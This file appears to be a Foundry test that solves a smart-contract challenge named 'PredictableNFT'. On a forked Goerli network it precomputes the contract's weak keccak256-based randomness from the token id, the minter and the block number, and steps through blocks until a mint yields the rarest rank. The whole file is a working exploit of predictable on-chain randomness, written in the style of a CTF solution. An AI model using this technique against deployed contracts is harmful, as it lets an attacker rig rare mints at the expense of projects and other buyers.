// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface NFTCollection {
    function id() external view returns (uint256);

    function mint() external payable returns (uint256);
}

contract PredictableNFTTest is Test {
    address nft;

    address hacker = address(0x1234);

    function setUp() public {
        uint256 fork = vm.createFork(vm.envString("GOERLI_RPC_URL"));
        vm.selectFork(fork);

        vm.deal(hacker, 1 ether);
        nft = address(0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC);
    }

    function test() public {
        vm.startPrank(hacker);
        uint mintedId;
        uint currentBlockNum = block.number;

        // Mint a Superior one, and do it within the next 100 blocks.
        for (uint i = 0; i < 100; i++) {
            vm.roll(currentBlockNum);

            bool isRare = (uint256(
                keccak256(
                    abi.encode(
                        NFTCollection(nft).id() + 1,
                        hacker,
                        block.number
                    )
                )
            ) % 100) > 90;

            if (isRare) {
                mintedId = NFTCollection(nft).mint{value: 1 ether}();
                break;
            }

            currentBlockNum++;
        }

        // get rank from `mapping(tokenId => rank)`
        (, bytes memory ret) = nft.call(
            abi.encodeWithSignature("tokens(uint256)", mintedId)
        );
        uint mintedRank = uint(bytes32(ret));
        assertEq(mintedRank, 3, "not Superior(rank != 3)");
    }
}
